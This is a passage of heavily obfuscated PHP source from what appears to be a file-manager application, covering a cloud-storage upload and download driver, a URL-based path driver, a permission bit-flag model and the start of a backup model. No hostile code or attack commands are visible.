$ÄŸã—¼²[$µÚÖÜ¹[1341]] : !1; } public function upload($æë…§ÎÕ, $†öóêä’, $åÁÉŒå€ = false, $´„ùğÍ¢ = REPEAT_REPLACE) { $“«üÖ·í =& $_SERVER[‘ÆÜ‘œ]; if (!$†öóêä’ || !@file_exists($†öóêä’)) { return !1; } $†Æö·Ò = IO::size($†öóêä’); if ($†Æö·Ò <= 1024 * 1024 * 200) { $Õà‰¤¢‚ = array($“«üÖ·í[1733] . $†öóêä’); $†ä«ÔÑ = $this->ussRequest($æë…§ÎÕ, $“«üÖ·í[254], $Õà‰¤¢‚); return $†ä«ÔÑ[$“«üÖ·í[1351]] ? $this->getPathOuter($æë…§ÎÕ) : !1; } $¬æ’©€Á = 1024 * 1024 * 10; $µàÉĞÙÜ = array($“«üÖ·í[1734], $“«üÖ·í[1735] . $†Æö·Ò, $“«üÖ·í[1736], $“«üÖ·í[1737] . $¬æ’©€Á); $†ä«ÔÑ = $this->ussRequest($æë…§ÎÕ, $“«üÖ·í[254], !1, $µàÉĞÙÜ); if (!$†ä«ÔÑ[$“«üÖ·í[1351]]) { return !1; } $À¶³Æ¬Ü = $†ä«ÔÑ[$“«üÖ·í[1341]]; $öÈÄ·ó° = 0; $Æ©ôÌ°ò = $À¶³Æ¬Ü[$“«üÖ·í[1738]]; $‹ß³èÏ = fopen($†öóêä’, $“«üÖ·í[1617]); if (!$‹ß³èÏ) { return !1; } do { $úåİúü = $À¶³Æ¬Ü[$“«üÖ·í[1739]]; fseek_64($‹ß³èÏ, $öÈÄ·ó°); $«ïÂ€ = fread($‹ß³èÏ, $úåİúü); $àæ‚ûÑ = 0; do { $àæ‚ûÑ++; $À¶³Æ¬Ü = $this->uploadPart($æë…§ÎÕ, $À¶³Æ¬Ü, $«ïÂ€); } while (!$À¶³Æ¬Ü && $àæ‚ûÑ < 3); if (!$À¶³Æ¬Ü) { return !1; } $Æ©ôÌ°ò = $À¶³Æ¬Ü[$“«üÖ·í[1738]]; $öÈÄ·ó° += $úåİúü; } while ($Æ©ôÌ°ò != -1); fclose($‹ß³èÏ); $µàÉĞÙÜ = array($“«üÖ·í[1740], $“«üÖ·í[1741] . $À¶³Æ¬Ü[$“«üÖ·í[1742]], $“«üÖ·í[1736]); $†ä«ÔÑ = $this->ussRequest($æë…§ÎÕ, $“«üÖ·í[254], !1, $µàÉĞÙÜ); return $†ä«ÔÑ[$“«üÖ·í[1351]] ? $this->getPathOuter($Û­š¢ıÏ) : !1; } private function uploadPart($¦ÁŠŠß¯, $©ñÈÄ¾, &$ˆæª«âº) { $šìË  =& $_SERVER[‘ÆÜ‘œ]; $²´»¿è = array($šìË [1743], $šìË [1741] . $©ñÈÄ¾[$šìË [1742]], $šìË [1744] . $©ñÈÄ¾[$šìË [1738]], $šìË [144] . $©ñÈÄ¾[$šìË [1739]]); $³Êèú‰ = $this->ussRequest($¦ÁŠŠß¯, $šìË [254], $ˆæª«âº, $²´»¿è); return !$³Êèú‰[$šìË [1351]] ? $³Êèú‰[$šìË [1351]] : $³Êèú‰[$šìË [1341]]; } public function uploadFormData($òÆ÷àç•, $ôìêî‚ = 3600) { return $this->uploadPolicy($òÆ÷àç•, $ôìêî‚); } public function uploadMultiData($§ÏÙù›, $Ø›õ ³´ = 3600) { $ÖæßÎòš =& $_SERVER[‘ÆÜ‘œ]; $º»Ñ¶¢ï = (int) $GLOBALS[$ÖæßÎòš[7]][$ÖæßÎòš[79]]; return $this->uploadPolicy($§ÏÙù›, $Ø›õ ³´, $º»Ñ¶¢ï); } private function uploadPolicy($ıùı—¥Ó, $ì£¥€¼¼ = 3600, $§·ÄœœÍ = 0) { $ãíÕ¨‹ß =& $_SERVER[‘ÆÜ‘œ]; $ä¼£§¤Õ = $ãíÕ¨‹ß[8] . $this->bucket; $Ûˆ¶—‘ú = gmdate($ãíÕ¨‹ß[1652]); $ç·ôùîß = array($ãíÕ¨‹ß[1745] => $this->bucket, $ãíÕ¨‹ß[1746] => $ıùı—¥Ó, $ãíÕ¨‹ß[1747] => time() + $ì£¥€¼¼, $ãíÕ¨‹ß[1748] => $Ûˆ¶—‘ú); if ($§·ÄœœÍ) { $ç·ôùîß[$ãíÕ¨‹ß[1637]] = $§·ÄœœÍ; } $ïºí®¤• = base64_encode(json_encode($ç·ôùîß)); $Øæ‰ğñ¶ = base64_encode(hash_hmac($ãíÕ¨‹ß[1702], "\120\117\x53\124\46{$ä¼£§¤Õ}\46{$Ûˆ¶—‘ú}\x26{$ïºí®¤•}", md5("{$this->userpass}"), !0)); $ÉÌÄ± = array($ãíÕ¨‹ß[278] => $ïºí®¤•, $ãíÕ¨‹ß[1749] => "\125\x50\x59\x55\x4e\x20{$this->username}\72{$Øæ‰ğñ¶}", $ãíÕ¨‹ß[207] => $this->endpoint . $ä¼£§¤Õ); return $ÉÌÄ±; } public function download($Í×âáÚå, $Ó¤†«) { $€³‹ô = IO::getPathInner(IO::mkfile($Ó¤†«)); if (!($÷ùİĞÈÍ = $this->link($Í×âáÚå))) { return !1; } $å×ÅĞÏó = 0; $¼’Í¼ì = 1024 * 200; $‰˜¯“âõ = fopen($€³‹ô, $_SERVER[‘ÆÜ‘œ][1696]); while (!0) { $ˆäùš©„ = $this->fileSubstr($Í×âáÚå, $å×ÅĞÏó, $¼’Í¼ì); if ($ˆäùš©„ === !1) { return !1; } fwrite($‰˜¯“âõ, $ˆäùš©„); $å×ÅĞÏó += $¼’Í¼ì; if (strlen($ˆäùš©„) < $¼’Í¼ì) { break; } } fclose($‰˜¯“âõ); return $Ó¤†«; } public function link($êšµ¦Šã, $ŞŒÉşì© = array()) { $­®ƒ¸†¡ =& $_SERVER[‘ÆÜ‘œ]; $êšµ¦Šã = trim($êšµ¦Šã, $­®ƒ¸†¡[8]); if (!empty($this->token)) { $Å§ŸÃçó = strtotime(date($­®ƒ¸†¡[1750])); $”ù²†Ğ´ = substr(md5($this->token . $­®ƒ¸†¡[285] . $Å§ŸÃçó . $­®ƒ¸†¡[1751] . $êšµ¦Šã), 12, 8) . $Å§ŸÃçó; $ŞŒÉşì©[] = $­®ƒ¸†¡[1752] . $”ù²†Ğ´; } $”¾«ĞÃ» = !empty($ŞŒÉşì©) ? $­®ƒ¸†¡[76] . implode($­®ƒ¸†¡[285], $ŞŒÉşì©) : $­®ƒ¸†¡[12]; return $this->getHost() . $­®ƒ¸†¡[8] . $this->pathEncode($êšµ¦Šã) . $”¾«ĞÃ»; } public function fileOut($‘„¤ÀÍı, $Ù±ó×†  = false, $Ù–Úøº­ = false, $’í¾€µı = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‘„¤ÀÍı, $Ù±ó×† , $Ù–Úøº­, $’í¾€µı); } if (!$Ù–Úøº­) { $Ù–Úøº­ = $this->pathThis($‘„¤ÀÍı); } $ŠË¼Ğ˜Â = $Ù±ó×†  ? array($_SERVER[‘ÆÜ‘œ][1753] . rawurlencode($Ù–Úøº­)) : array(); $ÁëÍ·²ø = $this->link($‘„¤ÀÍı, $ŠË¼Ğ˜Â); $this->fileOutLink($ÁëÍ·²ø); } public function fileOutServer($¢Íú¾¿, $¿“Œº£Å = false, $Ô‚‘ü÷™ = false, $õûğÎ¯’ = '') { parent::fileOut($¢Íú¾¿, $¿“Œº£Å, $Ô‚‘ü÷™, $õûğÎ¯’); } public function fileOutImage($¢ÂÒğ•¦, $³¦ØŒç¹ = 250) { $Çï¥Éæí = $this->link($¢ÂÒğ•¦ . $_SERVER[‘ÆÜ‘œ][1754] . $³¦ØŒç¹); $this->fileOutLink($Çï¥Éæí); } public function fileOutImageServer($áËó•È§, $²‘ºø»Æ = 250) { parent::fileOutImage($áËó•È§, $²‘ºø»Æ); } public function hashMd5($ñô®˜ßÎ) { $°×Ïò¬ê =& $_SERVER[‘ÆÜ‘œ]; $ãäÑ”ñí = $this->_objectMeta($ñô®˜ßÎ); return isset($ãäÑ”ñí[$°×Ïò¬ê[246]]) ? $ãäÑ”ñí[$°×Ïò¬ê[246]] : !1; } public function size($Îı«¯ä¯) { $ŒÁÏı§ = $this->objectMeta($Îı«¯ä¯); return $ŒÁÏı§ ? $ŒÁÏı§[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function info($ÃÄˆÅ«†) { if ($this->isFolder($ÃÄˆÅ«†)) { return $this->folderInfo($ÃÄˆÅ«†); } else { if ($this->isFile($ÃÄˆÅ«†)) { return $this->fileInfo($ÃÄˆÅ«†); } } return !1; } public function exist($óş¦ÊÄä) { return $this->isFile($óş¦ÊÄä) || $this->isFolder($óş¦ÊÄä); } public function isFile($Ôõ½ì¦ˆ) { return !$this->isFolder($Ôõ½ì¦ˆ) && $this->objectMeta($Ôõ½ì¦ˆ); } public function isFolder($ÆÓËÚÍ) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][178], $ÆÓËÚÍ); } protected function objectMeta($şİ³¤¼) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][180], $şİ³¤¼); } protected function _objectMeta($Ë»à»Ø‚) { $öİøëÂ =& $_SERVER[‘ÆÜ‘œ]; if ($Ë»à»Ø‚ == $öİøëÂ[12] || $Ë»à»Ø‚ == $öİøëÂ[8]) { return array(); } $Êãñ¢ ï = $this->ussRequest($Ë»à»Ø‚, $öİøëÂ[1755]); if (!$Êãñ¢ ï[$öİøëÂ[1351]]) { return null; } $øßí²úà = isset($Êãñ¢ ï[$öİøëÂ[1341]]) ? $Êãñ¢ ï[$öİøëÂ[1341]] : array(); if (!isset($øßí²úà[$öİøëÂ[1756]])) { return null; } $ä¤÷×«† = array($öİøëÂ[33] => isset($øßí²úà[$öİøëÂ[1756]]) ? $øßí²úà[$öİøëÂ[1756]] : null, $öİøëÂ[79] => isset($øßí²úà[$öİøëÂ[1757]]) ? $øßí²úà[$öİøëÂ[1757]] : null, $öİøëÂ[246] => isset($øßí²úà[$öİøëÂ[1758]]) ? $øßí²úà[$öİøëÂ[1758]] : null, $öİøëÂ[1725] => isset($øßí²úà[$öİøëÂ[1759]]) ? $øßí²úà[$öİøëÂ[1759]] : null); $ä¤÷×«†[$öİøëÂ[1726]] = isset($øßí²úà[$öİøëÂ[1760]]) ? strtotime($øßí²úà[$öİøëÂ[1760]]) : $ä¤÷×«†[$öİøëÂ[1725]]; return $ä¤÷×«†; } protected function _isFolder($ÖãÊÆï) { $ÚäÎµµ­ =& $_SERVER[‘ÆÜ‘œ]; if ($ÖãÊÆï == $ÚäÎµµ­[12] || $ÖãÊÆï == $ÚäÎµµ­[8]) { return !0; } $íÆ±Ûáì = $this->_objectMeta($ÖãÊÆï); return isset($íÆ±Ûáì[$ÚäÎµµ­[33]]) && $íÆ±Ûáì[$ÚäÎµµ­[33]] == $ÚäÎµµ­[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($œ«Íåú = false) { } public function exist($ÜÙÈç›) { $€–œ²Ïã = $this->info($ÜÙÈç›); return $€–œ²Ïã[$_SERVER[‘ÆÜ‘œ][233]]; } public function isFile($àÙ¾ÌË¤) { $ıÔß²æ— = $this->info($àÙ¾ÌË¤); return $ıÔß²æ—[$_SERVER[‘ÆÜ‘œ][233]]; } public function isFolder($Ü‰€«É¹) { return !1; } public function size($½ñ…İÁ¨) { $²¦Ø€¯ = $this->info($½ñ…İÁ¨); return $²¦Ø€¯[$_SERVER[‘ÆÜ‘œ][79]]; } public function info($µ¥İÆÖ‡) { return $this->infoParse($µ¥İÆÖ‡); } public function infoAuth($ù…¿§ÎÔ) { return $this->infoParse($ù…¿§ÎÔ); } public function infoWithChildren($ğ«ÆÎ¥) { return $this->infoParse($ğ«ÆÎ¥); } public function infoFull($ÉğúÌ¶Í) { return $this->infoParse($ÉğúÌ¶Í); } private function infoParse($ã˜±¶êÔ) { $üÖªşåƒ =& $_SERVER[‘ÆÜ‘œ]; $‹•ĞŸšÑ = $this->header($ã˜±¶êÔ); if (!$‹•ĞŸšÑ || !$‹•ĞŸšÑ[$üÖªşåƒ[857]]) { return !1; } $ç¢ı‘Çµ = _get($‹•ĞŸšÑ, $üÖªşåƒ[422], 0); $ØŞÖƒö = array($üÖªşåƒ[32] => $‹•ĞŸšÑ[$üÖªşåƒ[32]], $üÖªşåƒ[87] => $ã˜±¶êÔ, $üÖªşåƒ[33] => $üÖªşåƒ[231], $üÖªşåƒ[79] => intval($ç¢ı‘Çµ), $üÖªşåƒ[167] => get_path_ext($‹•ĞŸšÑ[$üÖªşåƒ[32]]), $üÖªşåƒ[1614] => $ç¢ı‘Çµ > 0 && $‹•ĞŸšÑ[$üÖªşåƒ[1761]], $üÖªşåƒ[1615] => !1); return $ØŞÖƒö; } private function header($Ó–µªÏÜ) { $°·ææ› =& $_SERVER[‘ÆÜ‘œ]; if (isset(self::$_cacheHeader[$Ó–µªÏÜ])) { return self::$_cacheHeader[$Ó–µªÏÜ]; } $’ÇÊ»±î = isset($GLOBALS[$°·ææ›[1762]]) ? $GLOBALS[$°·ææ›[1762]] : !1; $GLOBALS[$°·ææ›[1762]] = !0; self::$_cacheHeader[$Ó–µªÏÜ] = url_header($Ó–µªÏÜ); $GLOBALS[$°·ææ›[1762]] = $’ÇÊ»±î; return self::$_cacheHeader[$Ó–µªÏÜ]; } public function hashSimple($Ğú­Èˆª, $ªğ¼æ = false) { $÷±€¼® =& $_SERVER[‘ÆÜ‘œ]; $ÆğØ£¨­ = $this->info($Ğú­Èˆª); if (!$ÆğØ£¨­ || !$ÆğØ£¨­[$÷±€¼®[233]]) { return !1; } $ˆº—³İ = $ÆğØ£¨­[$÷±€¼®[79]]; $ààÉÇ›È = 200; $¾ß™€É = 50; if ($ˆº—³İ <= $ààÉÇ›È * $¾ß™€É) { return md5($this->fileSubstr($Ğú­Èˆª, 0, $ˆº—³İ)) . $ˆº—³İ; } $À©œÕ = intval($ˆº—³İ / $¾ß™€É); $¯İÚ«µ° = $÷±€¼®[12]; $ïî–àêØ = timeFloat(); $¿ÒæŸ¯– = 15; for ($ü¤ø×¤× = 0; $ü¤ø×¤× < $¾ß™€É; $ü¤ø×¤×++) { if (timeFloat() - $ïî–àêØ > $¿ÒæŸ¯–) { return !1; } $­ËŒäæÛ = $this->fileSubstr($Ğú­Èˆª, $À©œÕ * $ü¤ø×¤×, $ààÉÇ›È); if (!$­ËŒäæÛ) { return !1; } $¯İÚ«µ° .= $­ËŒäæÛ; } $¯İÚ«µ° .= $this->fileSubstr($Ğú­Èˆª, $ˆº—³İ - $ààÉÇ›È, $ààÉÇ›È); return md5($¯İÚ«µ°) . $ˆº—³İ; } public function getContent($ö©¼‘µé) { return $this->fileSubstr($ö©¼‘µé); } public function fileSubstr($¯†»£è‰, $’™Â×ºƒ = 0, $÷±õ¤Óö = -1) { $—òıÆ =& $_SERVER[‘ÆÜ‘œ]; $ŞòÅ­³ = $this->info($¯†»£è‰); if (!$ŞòÅ­³ || !$ŞòÅ­³[$—òıÆ[233]] && $ŞòÅ­³[$—òıÆ[79]] > 1024 * 1024 * 10) { return !1; } if ($÷±õ¤Óö === -1) { $÷±õ¤Óö = $ŞòÅ­³[$—òıÆ[79]]; } if ($÷±õ¤Óö == 0) { return $—òıÆ[12]; } $«€–“Ó¯ = array($—òıÆ[1763] . $’™Â×ºƒ . $—òıÆ[896] . ($’™Â×ºƒ + $÷±õ¤Óö - 1)); $ÙØİ™¯ú = url_request($¯†»£è‰, $—òıÆ[1557], !1, $«€–“Ó¯, !1, !1, 30); return $ÙØİ™¯ú[$—òıÆ[1341]] ? $ÙØİ™¯ú[$—òıÆ[1341]] : $—òıÆ[12]; } public function download($êé­ä±è, $ÚÑŠ¹‚†) { Downloader::start($êé­ä±è, $ÚÑŠ¹‚†); return $ÚÑŠ¹‚†; } } goto Bö–ÍÃ÷š˜; d¥Æ°Û‰ĞŠ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ğÜÉü™¿ =& $_SERVER[‘ÆÜ‘œ]; $›’ŠŞºÁ = array(array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2137]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2139], $ğÜÉü™¿[2140] => 1, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2143]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2144], $ğÜÉü™¿[2140] => 2, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2145]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2146], $ğÜÉü™¿[2140] => 3, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2147]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2148], $ğÜÉü™¿[2140] => 4, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_VIEW), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2149]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2150], $ğÜÉü™¿[2140] => 5, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2151]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2152], $ğÜÉü™¿[2140] => 6, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ğÜÉü™¿[517] => LNG($ğÜÉü™¿[2153]), $ğÜÉü™¿[2138] => $ğÜÉü™¿[2154], $ğÜÉü™¿[2140] => 7, $ğÜÉü™¿[2141] => 1, $ğÜÉü™¿[2142] => 0)); return $›’ŠŞºÁ; } public static function authCheck($‘ú¹¸‹«, $Íğúê•É, $µ»•—° = true) { $«³ÑÊËê =& $_SERVER[‘ÆÜ‘œ]; $‘ú¹¸‹« = intval($‘ú¹¸‹«); if ($µ»•—°) { if (KodUser::isRoot() && $GLOBALS[$«³ÑÊËê[6]][$«³ÑÊËê[2155]]) { return !0; } } if ($‘ú¹¸‹« <= 0) { return !1; } if (($‘ú¹¸‹« & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‘ú¹¸‹« & $Íğúê•É); } public static function authCheckShow($˜ˆùù‹) { return self::authCheck($˜ˆùù‹, self::AUTH_SHOW); } public static function authCheckView($ÄáŞ” §) { return self::authCheck($ÄáŞ” §, self::AUTH_VIEW); } public static function authCheckDownload($–ó˜âœ) { return self::authCheck($–ó˜âœ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¼ÄºÙ±) { return self::authCheck($¼ÄºÙ±, self::AUTH_UPLOAD); } public static function authCheckEdit($ìğ›€¸) { return self::authCheck($ìğ›€¸, self::AUTH_EDIT); } public static function authCheckRemove($¹»Ùşñ) { return self::authCheck($¹»Ùşñ, self::AUTH_REMOVE); } public static function authCheckShare($É´‰±Ç) { return self::authCheck($É´‰±Ç, self::AUTH_SHARE); } public static function authCheckComment($ëï«õå) { return self::authCheck($ëï«õå, self::AUTH_COMMENT); } public static function authCheckEvent($ŸÓš¡á) { return self::authCheck($ŸÓš¡á, self::AUTH_EVENT); } public static function authCheckRoot($ÔÑ§Ÿ„) { return self::authCheck($ÔÑ§Ÿ„, self::AUTH_ROOT); } public static function authCheckAction($šÃø³„—, $„áÓ¥‰–) { $½‡¨¬ß =& $_SERVER[‘ÆÜ‘œ]; $“¾–ƒùî = array($½‡¨¬ß[1511] => self::AUTH_SHOW, $½‡¨¬ß[1512] => self::AUTH_VIEW, $½‡¨¬ß[1333] => self::AUTH_DOWNLOAD, $½‡¨¬ß[108] => self::AUTH_UPLOAD, $½‡¨¬ß[1513] => self::AUTH_EDIT, $½‡¨¬ß[1282] => self::AUTH_REMOVE, $½‡¨¬ß[1514] => self::AUTH_SHARE, $½‡¨¬ß[439] => self::AUTH_COMMENT, $½‡¨¬ß[1515] => self::AUTH_EVENT, $½‡¨¬ß[1516] => self::AUTH_ROOT); if (!isset($“¾–ƒùî[$„áÓ¥‰–])) { return; } $¶…©å”ş = $“¾–ƒùî[$„áÓ¥‰–]; $šÃø³„— = intval($šÃø³„—); if ($šÃø³„— <= 0) { return !1; } if (($šÃø³„— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($šÃø³„— & $¶…©å”ş); } public static function authDisable($òêÙ£«, $»Ò§Òñı) { if (intval($òêÙ£«) <= 0) { return 0; } return intval($òêÙ£«) & ~$»Ò§Òñı; } public $optionType = "\x53\171\x73\164\145\155\56\163\x6f\165\x72\x63\145\101\165\x74\x68\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\141\165\x74\x68", "\x6c\141\142\145\154", "\x64\x69\163\160\x6c\141\171", "\x73\x79\163\164\x65\155", "\x73\x6f\x72\x74"); public function initData() { $ÒïÆØ… = $this->authDefault(); foreach ($ÒïÆØ… as $Âıò½â) { $this->add($Âıò½â); } } public function findAuth($¼”Õ§¨¿, $œö¡Úê‘) { $Ä‡¦Éª‚ =& $_SERVER[‘ÆÜ‘œ]; $™Öß¬ìÓ = parent::listData(); foreach ($™Öß¬ìÓ as $Å„Ñ÷Ëé) { $õŠ„¬õ = intval($Å„Ñ÷Ëé[$Ä‡¦Éª‚[510]]); if ($õŠ„¬õ <= 0 || $Å„Ñ÷Ëé[$Ä‡¦Éª‚[2156]] == 0) { continue; } if (($õŠ„¬õ & $¼”Õ§¨¿) != $¼”Õ§¨¿) { continue; } if (($õŠ„¬õ & $œö¡Úê‘) != 0) { continue; } return $Å„Ñ÷Ëé[$Ä‡¦Éª‚[495]]; } return !1; } public function findAuthMax($ÒñòãìÀ, $ŒÂÖú’Ğ) { $ºÁŞûÆş =& $_SERVER[‘ÆÜ‘œ]; $Ç©Ä‘ÂŠ = !1; $¾à¬¯ÎÓ = parent::listData(); foreach ($¾à¬¯ÎÓ as $™Ñ£ÜØ®) { $ºç†Şƒ¥ = intval($™Ñ£ÜØ®[$ºÁŞûÆş[510]]); if ($ºç†Şƒ¥ <= 0 || $™Ñ£ÜØ®[$ºÁŞûÆş[2156]] == 0) { continue; } if (($ºç†Şƒ¥ & $ÒñòãìÀ) != $ÒñòãìÀ) { continue; } if (($ºç†Şƒ¥ & $ŒÂÖú’Ğ) != 0) { continue; } if (!$Ç©Ä‘ÂŠ) { $Ç©Ä‘ÂŠ = $™Ñ£ÜØ®; continue; } if (intval($Ç©Ä‘ÂŠ[$ºÁŞûÆş[510]]) < $ºç†Şƒ¥) { $Ç©Ä‘ÂŠ = $™Ñ£ÜØ®; } } return $Ç©Ä‘ÂŠ ? $Ç©Ä‘ÂŠ[$ºÁŞûÆş[495]] : !1; } public function findAuthReadOnly() { $¨Óœ¹Ä = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ˆ¦ì’õÔ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¨Óœ¹Ä, $ˆ¦ì’õÔ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ìªò±§ø =& $_SERVER[‘ÆÜ‘œ]; $´·€ÄÔ¨ = parent::listData(); $ÅŞÎÅÖ = !1; foreach ($´·€ÄÔ¨ as $Ì”©¢÷Å) { if ($Ì”©¢÷Å[$Ìªò±§ø[510]] <= 0 || $Ì”©¢÷Å[$Ìªò±§ø[2156]] == $Ìªò±§ø[229]) { continue; } if (!$ÅŞÎÅÖ) { $ÅŞÎÅÖ = $Ì”©¢÷Å; continue; } if ($ÅŞÎÅÖ[$Ìªò±§ø[510]] > $Ì”©¢÷Å[$Ìªò±§ø[510]]) { $ÅŞÎÅÖ = $Ì”©¢÷Å; } } return $ÅŞÎÅÖ ? $ÅŞÎÅÖ[$Ìªò±§ø[495]] : $Ìªò±§ø[12]; } public function listData($¨Û»Êëë = false, $¬»‰ˆè = "\x73\157\162\x74", $ÌöÁá¥× = false) { return parent::listData($¨Û»Êëë, $¬»‰ˆè, $ÌöÁá¥×); } public function update($Î‹¸³Ë, $ÊÑèÏ—Ö) { $™ï·ò¸¢ =& $_SERVER[‘ÆÜ‘œ]; $¼š‚¨åû = parent::listData($Î‹¸³Ë); $Âóñºş” = $this->findByName($ÊÑèÏ—Ö[$™ï·ò¸¢[32]]); if (!$¼š‚¨åû || $Âóñºş” && $Âóñºş”[$™ï·ò¸¢[495]] != $¼š‚¨åû[$™ï·ò¸¢[495]]) { return !1; } $this->filterAuth($ÊÑèÏ—Ö[$™ï·ò¸¢[510]]); return parent::update($Î‹¸³Ë, $ÊÑèÏ—Ö); } public function remove($ÆæÔöÇÈ) { $ãˆÁ™“ = parent::listData($ÆæÔöÇÈ); if (!$ãˆÁ™“ || $ãˆÁ™“[$_SERVER[‘ÆÜ‘œ][190]]) { return !1; } return parent::remove($ÆæÔöÇÈ); } public function add($±ÓƒåµĞ = array()) { $Ï‡ÜÒÃæ =& $_SERVER[‘ÆÜ‘œ]; if ($this->findByName($±ÓƒåµĞ[$Ï‡ÜÒÃæ[32]])) { return !1; } $ôèÌÕİ“ = array($Ï‡ÜÒÃæ[32] => $Ï‡ÜÒÃæ[12], $Ï‡ÜÒÃæ[510] => 1, $Ï‡ÜÒÃæ[2157] => $Ï‡ÜÒÃæ[2146], $Ï‡ÜÒÃæ[2156] => 1, $Ï‡ÜÒÃæ[190] => 0, $Ï‡ÜÒÃæ[2158] => 0); $±ÓƒåµĞ = array_merge($ôèÌÕİ“, $±ÓƒåµĞ); $±ÓƒåµĞ[$Ï‡ÜÒÃæ[2158]] = $this->getSort(); $this->filterAuth($±ÓƒåµĞ[$Ï‡ÜÒÃæ[510]]); return parent::insert($±ÓƒåµĞ); } private function getSort() { $±´´á =& $_SERVER[‘ÆÜ‘œ]; $Û¯—ö†¶ = parent::listData(); $¦·ĞÂùÚ = array_to_keyvalue($Û¯—ö†¶, $±´´á[12], $±´´á[2158]); return empty($¦·ĞÂùÚ) ? 0 : max($¦·ĞÂùÚ) + 1; } private function filterAuth(&$ñÈÒ°¤) { if (!$ñÈÒ°¤) { return; } $ìæºÏ…² = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $»åÎ© Ÿ = array(); foreach ($ìæºÏ…² as $ñÜÁëà) { if ($ñÈÒ°¤ & $ñÜÁëà) { $»åÎ© Ÿ[] = $ñÜÁëà; } } if (in_array(self::AUTH_ROOT, $»åÎ© Ÿ)) { $ñÈÒ°¤ = array_sum($ìæºÏ…²); return; } $İ€÷¬Ñ¢ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($»åÎ© Ÿ as $ñÜÁëà) { if (isset($İ€÷¬Ñ¢[$ñÜÁëà])) { $»åÎ© Ÿ = array_merge($»åÎ© Ÿ, $İ€÷¬Ñ¢[$ñÜÁëà]); } } $»åÎ© Ÿ[] = self::AUTH_SHOW; $ñÈÒ°¤ = array_sum(array_unique($»åÎ© Ÿ)); } public function sort($‡ß¾öÄä, $çíÆÔ³€) { return parent::update($‡ß¾öÄä, $çíÆÔ³€); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x62\x61\143\x6b\165\160\x4c\151\163\x74"; public $field = array("\x69\157", "\156\141\155\x65", "\x73\x74\141\x74\165\x73", "\x63\x6f\x6e\x74\x65\156\x74", "\155\141\156\x75\x61\154", "\x72\145\163\x75\x6c\x74", "\x74\x69\155\145\x46\x72\x6f\155", "\164\x69\155\145\x54\157"); public function config() { $÷ ËİÈƒ =& $_SERVER[‘ÆÜ‘œ]; Action($÷ ËİÈƒ[2159])->taskInit(); $¾ÍïÕª€ = Model($÷ ËİÈƒ[880])->get($÷ ËİÈƒ[887]); $¾ÍïÕª€ = json_decode($¾ÍïÕª€, !0); $¾ÍïÕª€ = is_array($¾ÍïÕª€) ? $¾ÍïÕª€ : array(); 